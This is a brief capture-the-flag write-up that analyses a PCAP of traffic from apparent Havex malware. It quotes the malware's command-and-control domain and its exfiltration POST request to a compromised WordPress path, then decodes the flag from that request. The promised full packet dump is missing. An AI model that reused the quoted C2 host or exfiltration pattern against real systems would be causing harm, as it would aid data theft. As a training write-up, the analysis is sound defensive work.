Summary: SCADA APT's FTW


The description of the challenge was as follows:
```
In this challenge you are presented with a PCAP that 
comes from a network infected by a well known SCADA 
related APT Threat (hint: pay attention to potential C&C)

Identify the relevant packets related to the malware and 
attempt to find the flag in the normal format
```

So first we had to download and unpack the relevant file. 
After fiddling around with wireshark we identified a suspiciously looking HTTP POST request to ```sinfulcelebs.freesexycomics.com```.

Full dump for the record:
```

A google search brought up a connection of this domain to the Havex Malware. 
It seems that it packs the data it wants to exfiltrate with bzip2 and then sends it as base64 encoded POST data. 
So first thing I thought of was extracting the content body.

While the base64 decoded body indeed identified as bzip2, unpacking was not possible since the bzip2 file was corrupted.
After a lot of failed tries to actually identify something useful in the dumped POST data I took another look at the 
packet and realised that there was another base64 encoded string, right there in the request's id parameter: 
```
POST /wp05/wp-admin/includes/tmp/tmp.php?id=VE1DVEZ7SGF2ZXhJc1RoZUZsYWd9 HTTP/1.1
```
which, base64 decoded gave the correct flag
```
TMCTF{HavexIsTheFlag}
```

Could have spared myself a lot of time if I had seen the parameter right away. :)
